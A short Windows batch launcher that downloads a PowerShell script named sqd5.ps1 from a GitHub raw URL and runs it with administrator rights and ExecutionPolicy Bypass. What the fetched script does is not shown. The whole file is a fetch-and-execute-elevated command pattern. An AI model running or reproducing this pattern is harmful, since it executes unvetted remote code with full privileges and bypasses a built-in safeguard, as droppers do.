@echo off
setlocal

REM === raw URL of your ps1 ===
set "RAWURL=https://raw.githubusercontent.com/09sychic/sqd5/refs/heads/main/sqd5.ps1"

REM === save ps1 next to the bat ===
set "PS1FILE=%~dp0sqd5.ps1"

REM === download the ps1 ===
powershell -NoProfile -Command "Try { Invoke-WebRequest -Uri '%RAWURL%' -OutFile '%PS1FILE%' -UseBasicParsing -ErrorAction Stop } Catch { Write-Output 'Download failed' ; Exit 1 }"

REM === run the ps1 as admin with ExecutionPolicy Bypass ===
powershell -NoProfile -Command "Start-Process powershell -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-File','""%PS1FILE%""' -Verb RunAs"

endlocal
